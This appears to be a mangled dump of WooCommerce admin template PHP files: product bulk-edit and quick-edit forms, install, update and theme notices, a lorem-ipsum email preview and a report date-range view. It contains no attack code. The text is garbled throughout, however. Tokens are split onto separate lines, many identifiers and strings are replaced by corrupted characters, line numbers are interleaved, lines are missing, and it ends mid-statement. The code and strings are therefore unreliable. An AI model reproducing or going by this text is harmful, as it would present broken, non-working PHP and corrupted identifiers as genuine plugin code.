 ) . '">'. 
$v®ue
 .'</option>';

137 
	}
}

139 </
	g£Ëù
>

140 </
	g¥ª
>

141 </
	gÏb–
>

142 <
div
 
	gşass
="alignright">

143 <
šput
 
ty³
="‹xt" 
Çme
="_Ëngth" 
şass
="‹xˆËngth" 
¶aûhŞd”
="<?ph°_eĞ'L’gth', 'woocomm”û' ); ?>" 
v®ue
="">

144 <
šput
 
ty³
="‹xt" 
Çme
="_width" 
şass
="‹xˆwidth" 
¶aûhŞd”
="<?ph°_eĞ'Width', 'woocomm”û' ); ?>" 
v®ue
="">

145 <
šput
 
ty³
="‹xt" 
Çme
="_height" 
şass
="‹xˆheight" 
¶aûhŞd”
="<?ph°_eĞ'Height', 'woocomm”û' ); ?>" 
v®ue
="">

146 </
div
>

147 </
div
>

148 <?
php
 
’dif
; ?>

150 <
	gÏb–
>

151 <
¥ª
 
	gşass
="t™Ë"><?
php
 
_e
Ğ'Visib™y', 'woocomm”û' ); ?></
	g¥ª
>

152 <
¥ª
 
	gşass
="input-text-wrap">

153 <
£Ëù
 
şass
="visib™y" 
Çme
="_visibility">

154 <?
php


155 
$İtiÚs
 = 
¬¿y
(

156 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

157 'visibË' => 
__
( 'Catalog &amp; search', 'woocommerce' ),

158 'ÿlog' => 
__
( 'Catalog', 'woocommerce' ),

159 '£¬ch' => 
__
( 'Search', 'woocommerce' ),

160 'hidd’' => 
__
( 'Hidden', 'woocommerce' )

162 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

163 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

166 </
	g£Ëù
>

167 </
	g¥ª
>

168 </
	gÏb–
>

169 <
	gÏb–
>

170 <
¥ª
 
	gşass
="t™Ë"><?
php
 
_e
Ğ'F—tu»d', 'woocomm”û' ); ?></
	g¥ª
>

171 <
¥ª
 
	gşass
="input-text-wrap">

172 <
£Ëù
 
şass
="ã©u»d" 
Çme
="_featured">

173 <?
php


174 
$İtiÚs
 = 
¬¿y
(

175 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

176 'yes' => 
__
( 'Yes', 'woocommerce' ),

177 'no' => 
__
( 'No', 'woocommerce' )

179 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

180 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

183 </
	g£Ëù
>

184 </
	g¥ª
>

185 </
	gÏb–
>

187 <
	gÏb–
>

188 <
¥ª
 
	gşass
="t™Ë"><?
php
 
_e
Ğ'IÀ¡ock?', 'woocomm”û' ); ?></
	g¥ª
>

189 <
¥ª
 
	gşass
="input-text-wrap">

190 <
£Ëù
 
şass
="¡ock_¡©us" 
Çme
="_stock_status">

191 <?
php


192 
$İtiÚs
 = 
¬¿y
(

193 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

194 'š¡ock' => 
__
( 'In stock', 'woocommerce' ),

195 'outof¡ock' => 
__
( 'Out of stock', 'woocommerce' )

197 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

198 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

201 </
	g£Ëù
>

202 </
	g¥ª
>

203 </
	gÏb–
>

204 <?
php
 ià(
g‘_İtiÚ
('woocommerce_manage_stock')=='yes') : ?>

206 <
Ïb–
>

207 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'Mªag¡ock?', 'woocomm”û' ); ?></
	g¥ª
>

208 <
¥ª
 
	gşass
="input-text-wrap">

209 <
£Ëù
 
şass
="mªage_¡ock" 
Çme
="_manage_stock">

210 <?
php


211 
$İtiÚs
 = 
¬¿y
(

212 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

213 'yes' => 
__
( 'Yes', 'woocommerce' ),

214 'no' => 
__
( 'No', 'woocommerce' )

216 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

217 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

220 </
	g£Ëù
>

221 </
	g¥ª
>

222 </
	gÏb–
>

224 <
div
 
	gşass
="inline-edit-group">

225 <
Ïb–
 
şass
="alignleft stock_qty_field">

226 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'Stock Qty', 'woocomm”û' ); ?></
	g¥ª
>

227 <
¥ª
 
	gşass
="input-text-wrap">

228 <
£Ëù
 
şass
="chªge_¡ock chªge_to" 
Çme
="change_stock">

229 <?
php


230 
$İtiÚs
 = 
¬¿y
(

231 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

232 '1' => 
__
( 'Changeo:', 'woocommerce' )

234 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

235 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

238 </
	g£Ëù
>

239 </
	g¥ª
>

240 </
	gÏb–
>

241 <
Ïb–
 
	gşass
="alignright">

242 <
šput
 
ty³
="numb”" 
Çme
="_¡ock" 
şass
="‹xˆ¡ock" 
¶aûhŞd”
="<?ph°_eĞ'Stock Qty', 'woocomm”û' ); ?>" 
¡•
="ªy" 
v®ue
="">

243 </
Ïb–
>

244 </
div
>

246 <
Ïb–
>

247 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'BackÜd”s?', 'woocomm”û' ); ?></
	g¥ª
>

248 <
¥ª
 
	gşass
="input-text-wrap">

249 <
£Ëù
 
şass
="backÜd”s" 
Çme
="_backorders">

250 <?
php


251 
$İtiÚs
 = 
¬¿y
(

252 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

253 'no' => 
__
( 'Do‚ot‡llow', 'woocommerce' ),

254 'nÙify' => 
__
( 'Allow, but‚otify customer', 'woocommerce' ),

255 'yes' => 
__
( 'Allow', 'woocommerce' )

257 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

258 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

261 </
	g£Ëù
>

262 </
	g¥ª
>

263 </
	gÏb–
>

265 <?
php
 
	g’dif
; ?>

267 <?
php
 
do_aùiÚ
( 'woocommerce_product_bulk_edit_end' ); ?>

269 <
šput
 
	gty³
="hidd’" 
Çme
="woocomm”û_bulk_ed™" 
v®ue
="1" />

270 <
šput
 
ty³
="hidd’" 
Çme
="woocomm”û_bulk_ed™_nÚû" 
v®ue
="<?phpƒcho wp_create_nonce( 'woocommerce_bulk_edit_nonce' ); ?>" />

271 </
div
>

272 </
f›ld£t
>

	@includes/admin/views/html-email-template-preview.php

1 <
	gp
>
LÜem
 
sum
 
dŞÜ
 
s™
 
	gam‘
, 
cÚ£ù‘ur
 
adiscšg
 
	g–™
. 
Sed
 
®iqu‘
 
dŸm
 
a
 
çcisis
 
	g–eiãnd
. 
C¿s
 
ac
 
ju¡o
 
	gãlis
. 
Mauris
 
	gçucibus
, 
Üci
 
eu
 
bÏnd™
 
	gãrm’tum
, 
lÜem
 
nibh
 
sŞlic™udš
 
	gmi
, s™ 
am‘
 
š‹rdum
 
m‘us
 
uºa
 
ut
 
	gÏcus
.</p>

3 <
	gp
>
Pha£Îus
 
quis
 
v¬ius
 
	gaugue
. 
Fusû
 
eu
 
euismod
 
	gËo
, 
a
 
accum§n
 
	g‹Îus
. 
Quisque
 
v™«
 
dŞÜ
ƒu 
ju¡o
 
cursus
 
	gege¡as
. 
Cum
 
sociis
 
Çtoque
 
³Çtibus
 
‘
 
magnis
 
dis
 
·¹ur›Á
 
	gmÚ‹s
, 
Çsûtur
 
ridiculus
 
	gmus
. 
Sed
 
s™
 
am‘
 
§p›n
 
	godio
. Sed 
³Î’‹sque
 
¬cu
 
	gmi
, qui 
m®esuada
 
Ëùus
 
ÏcšŸ
 
	g‘
. 
C¿s
‡ 
‹mpÜ
†eo.</p>

5 <
	gh2
>
LÜem
 
sum
 
	gdŞÜ
</h2>

7 <
	gp
>
Fusû
 
eu
 
euismod
 
	gËo
, 
a
 
accum§n
 
	g‹Îus
. 
Quisque
 
v™«
 
dŞÜ
ƒu 
ju¡o
 
cursus
 
	gege¡as
. 
Cum
 
sociis
 
Çtoque
 
³Çtibus
 
‘
 
magnis
 
dis
 
·¹ur›Á
 
	gmÚ‹s
, 
Çsûtur
 
ridiculus
 
	gmus
. 
Sed
 
s™
 
am‘
 
§p›n
 
	godio
. Sed 
³Î’‹sque
 
¬cu
 
	gmi
, 
quis
 
m®esuada
 
Ëùus
 
ÏcšŸ
 
	g‘
. 
C¿s
‡ 
‹mpÜ
†eo.</p>

	@includes/admin/views/html-notice-install.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gid
="mes§ge" 
şass
="updated woocommerce-message wc-connect">

5 <
p
><?
php
 
_e
Ğ'<¡rÚg>W–comtØWooComm”û</¡rÚg> &#8211; You\'»‡lmo¡„—dyØ¡¬ˆ£Îšg :)', 'woocomm”û' ); ?></
	gp
>

6 <
p
 
	gşass
="subm™"><
a
 
h»f
="<?ph°echØadd_qu”y_¬g('š¡®l_woocomm”û_·ges', 'Œue',‡dmš_u¾('admš.php?·ge=wc-£‰šgs'è); ?>" 
şass
="bu‰Ú-´im¬y"><?
php
 
_e
Ğ'In¡®ÈWooComm”û Pages', 'woocomm”û' ); ?></
	ga
> <¨şass="sk bu‰Ú-´im¬y" h»f="<?ph°echØadd_qu”y_¬g('sk_š¡®l_woocomm”û_·ges', 'Œue',‡dmš_u¾('admš.php?·ge=wc-£‰šgs'è); ?>"><?ph°_eĞ'Sk s‘up', 'woocomm”û' ); ?></a></
	gp
>

7 </
	gdiv
>

	@includes/admin/views/html-notice-template-check.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gid
="mes§ge" 
şass
="updated woocommerce-message wc-connect">

5 <
p
><?
php
 
_e
Ğ'<¡rÚg>You¸themha bundËd outd©ed cİ› oàWooComm”ûem¶©fes</¡rÚg> &#8211; iàyouƒncouÁ” funùiÚ®™y issue ÚhäÚ‹ndhi couldh»asÚ. Ensu» you upd©Ü„emovthem (š g’”® w»comm’d oÆy bundlšgh‹m¶©fe you‡ùu®ly‚“dØcu¡omize). S“hsy¡em„•ÜˆfÜ fuÎ d‘as.', 'woocomm”û' ); ?></
	gp
>

6 <
p
 
	gşass
="subm™"><
a
 
şass
="bu‰Ú-´im¬y" 
h»f
="<?ph°echØesc_u¾Ğadmš_u¾Ğ'admš.php?·ge=wc-¡©us' ) ); ?>"><?
php
 
_e
Ğ'Sy¡em Stus', 'woocomm”û' ); ?></
	ga
> <¨şass="sk bu‰Ú-´im¬y" h»f="<?ph°echØesc_u¾Ğadd_qu”y_¬gĞ'hide_‹m¶©e_fes_nÙiû', 'Œue' ) ); ?>"><?ph°_eĞ'Hidthi nÙiû', 'woocomm”û' ); ?></a></
	gp
>

7 </
	gdiv
>

	@includes/admin/views/html-notice-theme-support.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gid
="mes§ge" 
şass
="updated woocommerce-message wc-connect">

5 <
p
><?
php
 
_e
Ğ'<¡rÚg>You¸themdÛ nÙ deş¬WooComm”û suµÜt</¡rÚg> &#8211; iàyouƒncouÁ”†ayouˆissue ¶—£„—d ou¸š‹g¿tiÚ guidÜ choo£‡ WooComm”ûhem:)', 'woocomm”û' ); ?></
	gp
>

6 <
p
 
	gşass
="subm™"><
a
 
h»f
="<?ph°echØesc_u¾Ğ­¶y_f‹rsĞ'woocomm”û_docs_u¾', 'h‰p://docs.woÙhemes.com/docum’t/thœd-·¹y-cu¡om-theme-com·tib™y/', 'theme-com·tib™y' ) ); ?>" 
şass
="bu‰Ú-´im¬y"><?
php
 
_e
Ğ'ThemIÁeg¿tiÚ Guide', 'woocomm”û' ); ?></
	ga
> <¨şass="sk bu‰Ú-´im¬y" h»f="<?ph°echØesc_u¾Ğadd_qu”y_¬gĞ'hide_theme_suµÜt_nÙiû', 'Œue' ) ); ?>"><?ph°_eĞ'Hidthi nÙiû', 'woocomm”û' ); ?></a></
	gp
>

7 </
	gdiv
>

	@includes/admin/views/html-notice-update.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gid
="mes§ge" 
şass
="updated woocommerce-message wc-connect">

5 <
p
><?
php
 
_e
Ğ'<¡rÚg>WooComm”û D©¨Upd©Requœed</¡rÚg> &#8211; Wju¡‚“dØupd©you¸š¡®ÈtØthÏ‹¡ v”siÚ', 'woocomm”û' ); ?></
	gp
>

6 <
p
 
	gşass
="subm™"><
a
 
h»f
="<?ph°echØadd_qu”y_¬gĞ'do_upd©e_woocomm”û', 'Œue',‡dmš_u¾('admš.php?·ge=wc-£‰šgs'è); ?>" 
şass
="wc-upd©e-now bu‰Ú-´im¬y"><?
php
 
_e
Ğ'RuÀthupd©”', 'woocomm”û' ); ?></
	ga
></
	gp
>

7 </
	gdiv
>

8 <
süt
 
	gty³
="text/javascript">

9 
jQu”y
('.wc-upd©e-now').
şick
('şick', 
	$funùiÚ
(){

10 
v¬
 
ªsw”
 = 
	`cÚfœm
Ğ'<?ph°_eĞ'
It
 
is
 
¡rÚgly
 
»comm’ded
 
th©
 
you
 
backup
 
your
 
d©aba£
 
befÜe
 
´oûedšg
. 
A»
 you 
su»
 you 
wish
 
to
 
run
 
the
 
upd©”
 
now
?', '
woocomm”û
' ); ?>' );

11  
ªsw”
;

12 
	}
});

13 </
	gsüt
>

	@includes/admin/views/html-quick-edit-product.php

1 <
f›ld£t
 
	gşass
="inline-edit-col-left">

2 <
div
 
id
="woocomm”û-f›lds" 
şass
="inline-edit-col">

4 <
h4
><?
php
 
_e
Ğ'Produù D©a', 'woocomm”û' ); ?></
	gh4
>

6 <?
php
 
do_aùiÚ
( 'woocommerce_product_quick_edit_start' ); ?>

8 <?
php
 iàĞ
	$wc_´oduù_sku_’abËd
() ) : ?>

10 <
Ïb–
>

11 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'SKU', 'woocommerce' ); ?></span>

12 <
¥ª
 
şass
="input-text-wrap">

13 <
šput
 
ty³
="‹xt" 
Çme
="_sku" 
şass
="‹xˆsku" 
v®ue
="">

14 </
¥ª
>

15 </
Ïb–
>

16 <
br
 
şass
="clear" />

18 <?
php
 
’dif
; ?>

20 <
div
 
şass
="price_fields">

21 <
Ïb–
>

22 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'Price', 'woocommerce' ); ?></span>

23 <
¥ª
 
şass
="input-text-wrap">

24 <
šput
 
ty³
="‹xt" 
Çme
="_»guÏr_´iû" 
şass
="‹xˆ»guÏr_´iû" 
¶aûhŞd”
="<?ph°_eĞ'ReguÏ¸´iû', 'woocomm”û' ); ?>" 
v®ue
="">

25 </
¥ª
>

26 </
Ïb–
>

27 <
br
 
şass
="clear" />

28 <
Ïb–
>

29 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'Sale', 'woocommerce' ); ?></span>

30 <
¥ª
 
şass
="input-text-wrap">

31 <
šput
 
ty³
="‹xt" 
Çme
="_§Ë_´iû" 
şass
="‹xˆ§Ë_´iû" 
¶aûhŞd”
="<?ph°_eĞ'S®´iû', 'woocomm”û' ); ?>" 
v®ue
="">

32 </
¥ª
>

33 </
Ïb–
>

34 <
br
 
şass
="clear" />

35 </
div
>

37 <
Ïb–
 
şass
="alignleft">

38 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'Tax Status', 'woocommerce' ); ?></span>

39 <
¥ª
 
şass
="input-text-wrap">

40 <
£Ëù
 
şass
="x_¡©us" 
Çme
="_tax_status">

41 <?
php


42 
$İtiÚs
 = 
	`¬¿y
(

43 'xabË' => 
	`__
( 'Taxable', 'woocommerce' ),

44 'shpšg' => 
	`__
( 'Shipping only', 'woocommerce' ),

45 'nÚe' => 
	`_x
( 'None', 'Tax status', 'woocommerce' )

47 
	`fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

48 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '">' . 
$v®ue
 . '</option>';

49 
	}
}

51 </
	g£Ëù
>

52 </
	g¥ª
>

53 </
	gÏb–
>

54 <
br
 
	gşass
="clear" />

55 <
Ïb–
 
şass
="alignleft">

56 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'Tax CÏss', 'woocomm”û' ); ?></
	g¥ª
>

57 <
¥ª
 
	gşass
="input-text-wrap">

58 <
£Ëù
 
şass
="x_şass" 
Çme
="_tax_class">

59 <?
php


60 
$İtiÚs
 = 
¬¿y
(

61 '' => 
__
( 'Standard', 'woocommerce' )

64 
	g$x_şas£s
 = 
¬¿y_f‹r
Ğ
¬¿y_m­
Ğ'Œim', 
ex¶ode
Ğ"\n", 
g‘_İtiÚ
( 'woocommerce_tax_classes' ) ) ) );

66 iàĞ
	g$x_şas£s
 )

67 
fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

68 
	g$İtiÚs
[ 
§n™ize_t™Ë
Ğ
$şass
 ) ] = 
esc_html
( $class );

70 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

71 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">' . 
$v®ue
 . '</option>';

74 </
	g£Ëù
>

75 </
	g¥ª
>

76 </
	gÏb–
>

77 <
br
 
	gşass
="clear" />

79 <?
php
 iàĞ
wc_´oduù_weight_’abËd
(è|| 
	$wc_´oduù_dim’siÚs_’abËd
() ) : ?>

80 <
div
 
şass
="dimension_fields">

82 <?
php
 iàĞ
	$wc_´oduù_weight_’abËd
() ) : ?>

83 <
Ïb–
>

84 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'Weight', 'woocommerce' ); ?></span>

85 <
¥ª
 
şass
="input-text-wrap">

86 <
šput
 
ty³
="‹xt" 
Çme
="_weight" 
şass
="‹xˆweight" 
¶aûhŞd”
="0.00" 
v®ue
="">

87 </
¥ª
>

88 </
Ïb–
>

89 <
br
 
şass
="clear" />

90 <?
php
 
’dif
; ?>

92 <?
php
 iàĞ
	$wc_´oduù_dim’siÚs_’abËd
() ) : ?>

93 <
div
 
şass
="inline-edit-group dimensions">

94 <
div
>

95 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'L/W/H', 'woocommerce' ); ?></span>

96 <
¥ª
 
şass
="input-text-wrap">

97 <
šput
 
ty³
="‹xt" 
Çme
="_Ëngth" 
şass
="‹xˆËngth" 
¶aûhŞd”
="<?ph°_eĞ'L’gth', 'woocomm”û' ); ?>" 
v®ue
="">

98 <
šput
 
ty³
="‹xt" 
Çme
="_width" 
şass
="‹xˆwidth" 
¶aûhŞd”
="<?ph°_eĞ'Width', 'woocomm”û' ); ?>" 
v®ue
="">

99 <
šput
 
ty³
="‹xt" 
Çme
="_height" 
şass
="‹xˆheight" 
¶aûhŞd”
="<?ph°_eĞ'Height', 'woocomm”û' ); ?>" 
v®ue
="">

100 </
¥ª
>

101 </
div
>

102 </
div
>

103 <?
php
 
’dif
; ?>

105 </
div
>

106 <?
php
 
’dif
; ?>

108 <
Ïb–
 
şass
="alignleft">

109 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'Visibility', 'woocommerce' ); ?></span>

110 <
¥ª
 
şass
="input-text-wrap">

111 <
£Ëù
 
şass
="visib™y" 
Çme
="_visibility">

112 <?
php


113 
$İtiÚs
 = 
	`¬¿y
(

114 'visibË' => 
	`__
( 'Catalog &amp; search', 'woocommerce' ),

115 'ÿlog' => 
	`__
( 'Catalog', 'woocommerce' ),

116 '£¬ch' => 
	`__
( 'Search', 'woocommerce' ),

117 'hidd’' => 
	`__
( 'Hidden', 'woocommerce' )

119 
	`fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

120 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

121 
	}
}

123 </
	g£Ëù
>

124 </
	g¥ª
>

125 </
	gÏb–
>

126 <
Ïb–
 
	gşass
="alignleft featured">

127 <
šput
 
ty³
="checkbox" 
Çme
="_ã©u»d" 
v®ue
="1">

128 <
¥ª
 
şass
="checkbox-t™Ë"><?
php
 
_e
Ğ'F—tu»d', 'woocomm”û' ); ?></
	g¥ª
>

129 </
	gÏb–
>

130 <
br
 
	gşass
="clear" />

131 <
Ïb–
 
şass
="alignleft">

132 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'IÀ¡ock?', 'woocomm”û' ); ?></
	g¥ª
>

133 <
¥ª
 
	gşass
="input-text-wrap">

134 <
£Ëù
 
şass
="¡ock_¡©us" 
Çme
="_stock_status">

135 <?
php


136 
$İtiÚs
 = 
¬¿y
(

137 'š¡ock' => 
__
( 'In stock', 'woocommerce' ),

138 'outof¡ock' => 
__
( 'Out of stock', 'woocommerce' )

140 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

141 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) .'">'. 
$v®ue
 .'</option>';

144 </
	g£Ëù
>

145 </
	g¥ª
>

146 </
	gÏb–
>

148 <
div
 
	gşass
="stock_fields">

150 <?
php
 ià(
g‘_İtiÚ
('woocommerce_manage_stock')=='yes') : ?>

151 <
Ïb–
 
şass
="alignleft manage_stock">

152 <
šput
 
ty³
="checkbox" 
Çme
="_mªage_¡ock" 
v®ue
="1">

153 <
¥ª
 
şass
="checkbox-t™Ë"><?
php
 
_e
Ğ'Mªag¡ock?', 'woocomm”û' ); ?></
	g¥ª
>

154 </
	gÏb–
>

155 <
br
 
	gşass
="clear" />

156 <
Ïb–
 
şass
="stock_qty_field">

157 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'Stock Qty', 'woocomm”û' ); ?></
	g¥ª
>

158 <
¥ª
 
	gşass
="input-text-wrap">

159 <
šput
 
ty³
="numb”" 
Çme
="_¡ock" 
şass
="‹xˆ¡ock" 
¡•
="ªy" 
v®ue
="">

160 </
¥ª
>

161 </
Ïb–
>

162 <?
php
 
’dif
; ?>

164 </
	gdiv
>

166 <
Ïb–
 
	gşass
="alignleft">

167 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'BackÜd”s?', 'woocomm”û' ); ?></
	g¥ª
>

168 <
¥ª
 
	gşass
="input-text-wrap">

169 <
£Ëù
 
şass
="backÜd”s" 
Çme
="_backorders">

170 <?
php


171 
$İtiÚs
 = 
¬¿y
(

172 'no' => 
__
( 'Do‚ot‡llow', 'woocommerce' ),

173 'nÙify' => 
__
( 'Allow, but‚otify customer', 'woocommerce' ),

174 'yes' => 
__
( 'Allow', 'woocommerce' )

176 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

177 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

180 </
	g£Ëù
>

181 </
	g¥ª
>

182 </
	gÏb–
>

184 <?
php
 
do_aùiÚ
( 'woocommerce_product_quick_edit_end' ); ?>

186 <
šput
 
	gty³
="hidd’" 
Çme
="woocomm”û_quick_ed™" 
v®ue
="1" />

187 <
šput
 
ty³
="hidd’" 
Çme
="woocomm”û_quick_ed™_nÚû" 
v®ue
="<?phpƒcho wp_create_nonce( 'woocommerce_quick_edit_nonce' ); ?>" />

188 </
div
>

189 </
f›ld£t
>

	@includes/admin/views/html-report-by-date.php

1 <?
	gphp


6 <
div
 
	gid
="po¡¡uff" 
şass
="woocommerce-reports-wide">

7 <
div
 
şass
="postbox">

8 <
h3
 
şass
="stats_range">

9 <?
php
 
$this
->
g‘_expÜt_bu‰Ú
(); ?>

10 <
	gul
>

11 <?
php


12 
fÜ—ch
 ( 
$¿nges
 
as
 
$¿nge
 => 
$Çme
 )

13 
echo
 '<l˜şass="' . ( 
$cu¼’t_¿nge
 =ğ
$¿nge
 ? 'aùive' : '' ) . '"><¨h»f="' . 
»move_qu”y_¬g
Ğ
¬¿y
Ğ'¡¬t_d©e', '’d_d©e' ), 
add_qu”y_¬g
Ğ'¿nge', $¿ngèè. '">' . 
	g$Çme
 . '</a></li>';

15 <
li
 
	gşass
="custom <?phpƒcho $current_range == 'custom' ? 'active' : ''; ?>">

16 <?
php
 
_e
( 'Custom:', 'woocommerce' ); ?>

17 <
fÜm
 
	gm‘hod
="GET">

18 <
div
>

19 <?
php


21 
fÜ—ch
 ( 
$_GET
 
as
 
$key
 => 
$v®ue
 )

22 iàĞ
	$is_¬¿y
Ğ
$v®ue
 ) )

23 
	$fÜ—ch
 ( 
$v®ue
 
as
 
$v
 )

24 
echo
 '<špuˆty³="hidd’"‚ame="' . 
	`esc_©Œ
Ğ
	`§n™ize_‹xt_f›ld
Ğ
$key
 ) ) . '[]" v®ue="' .ƒsc_©ŒĞ§n™ize_‹xt_f›ldĞ
$v
 ) ) . '" />';

26 
echo
 '<špuˆty³="hidd’"‚ame="' . 
	`esc_©Œ
Ğ
	`§n™ize_‹xt_f›ld
Ğ
$key
 ) ) . '" v®ue="' .ƒsc_©ŒĞ§n™ize_‹xt_f›ldĞ
$v®ue
 ) ) . '" />';

28 <
šput
 
ty³
="hidd’" 
Çme
="¿nge" 
v®ue
="custom" />

29 <
šput
 
ty³
="‹xt" 
size
="9" 
¶aûhŞd”
="yyyy-mm-dd" 
v®ue
="<?ph°iàĞ!ƒm±yĞ$_GET['¡¬t_d©e'] ) )ƒchØesc_©ŒĞ$_GET['¡¬t_d©e'] ); ?>" 
Çme
="¡¬t_d©e" 
şass
="range_datepicker from" />

30 <
šput
 
ty³
="‹xt" 
size
="9" 
¶aûhŞd”
="yyyy-mm-dd" 
v®ue
="<?ph°iàĞ!ƒm±yĞ$_GET['’d_d©e'] ) )ƒchØesc_©ŒĞ$_GET['’d_d©e'] ); ?>" 
Çme
="’d_d©e" 
şass
="range_datepickero" />

31 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
v®ue
="<?php _e( 'Go', 'woocommerce' ); ?>" />

32 </
div
>

33 </
fÜm
>

34 </
li
>

35 </
ul
>

36 </
h3
>

37 <?
php
 iàĞ
	$em±y
Ğ
$hide_sideb¬
 ) ) : ?>

38 <
div
 
şass
="inside chart-with-sidebar">

39 <
div
 
şass
="chart-sidebar">

40 <?
php
 iàĞ
$Ëg’ds
 = 
$this
->
	$g‘_ch¬t_Ëg’d
() ) : ?>

41 <
ul
 
şass
="chart-legend">

42 <?
php
 
	$fÜ—ch
 ( 
$Ëg’ds
 
as
 
$Ëg’d
 ) : ?>

43 <
li
 
¡yË
="bÜd”-cŞÜ: <?ph°echØ$Ëg’d['cŞÜ']; ?>" <?
php
 iàĞ
	`is£t
Ğ
$Ëg’d
['highlight_£r›s'] ) ) 
echo
 'şass="highlight_£r›s" d©a-£r›s="' . 
	`esc_©Œ
( $legend['highlight_series'] ) . '"'; ?>>

44 <?
php
 
echo
 
$Ëg’d
['title']; ?>

45 </
li
>

46 <?
php
 
’dfÜ—ch
; ?>

47 </
ul
>

48 <?
php
 
’dif
; ?>

49 <
ul
 
şass
="chart-widgets">

50 <?
php
 
	`fÜ—ch
 ( 
$this
->
	$g‘_ch¬t_widg‘s
(è
as
 
$widg‘
 ) : ?>

51 <
li
 
şass
="chart-widget">

52 <?
php
 iàĞ
$widg‘
['t™Ë'] ) : ?><
h4
><?ph°
echo
 $widg‘['t™Ë']; ?></h4><?ph°
’dif
; ?>

53 <?
php
 
	`ÿÎ_u£r_func
Ğ
$widg‘
['callback'] ); ?>

54 </
li
>

55 <?
php
 
’dfÜ—ch
; ?>

56 </
ul
>

57 </
div
>

58 <
div
 
şass
="main">

59 <?
php
 
$this
->
	`g‘_maš_ch¬t
(); ?>

60 </
div
>

61 </
div
>

62 <?
php
 : ?>

63 <
div
 
şass
="inside">

64 <?
php
 
$this
->
	`g‘_maš_ch¬t
(); ?>

65 </
div
>

66 <?
php
 
’dif
; ?>

67 </
div
>

68 </
div
>

	@includes/admin/wc-admin-functions.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 
funùiÚ
 
	$wc_g‘_sü“n_ids
() {

19 
$wc_sü“n_id
 = 
	`§n™ize_t™Ë
Ğ
	`__
( 'WooCommerce', 'woocommerce' ) );

21  
	`­¶y_f‹rs
Ğ'woocomm”û_sü“n_ids', 
	`¬¿y
(

22 'tİËv–_·ge_' . 
$wc_sü“n_id
,

23 
$wc_sü“n_id
 . '_page_wc-reports',

24 
$wc_sü“n_id
 . '_page_wc-settings',

25 
$wc_sü“n_id
 . '_page_wc-status',

26 
$wc_sü“n_id
 . '_page_wc-addons',

38 
	}
}

51 
funùiÚ
 
wc_ü—‹_·ge
Ğ
$¦ug
, 
$İtiÚ
 = '', 
$·ge_t™Ë
 = '', 
$·ge_cÚ‹Á
 = '', 
$po¡_·»Á
 = 0 ) {

52 
glob®
 
$wpdb
;

54 
	g$İtiÚ_v®ue
 = 
g‘_İtiÚ
Ğ
$İtiÚ
 );

56 iàĞ
	g$İtiÚ_v®ue
 > 0 && 
g‘_po¡
Ğ
$İtiÚ_v®ue
 ) )

59 
	g$·ge_found
 = 
nuÎ
;

61 iàĞ
¡¾’
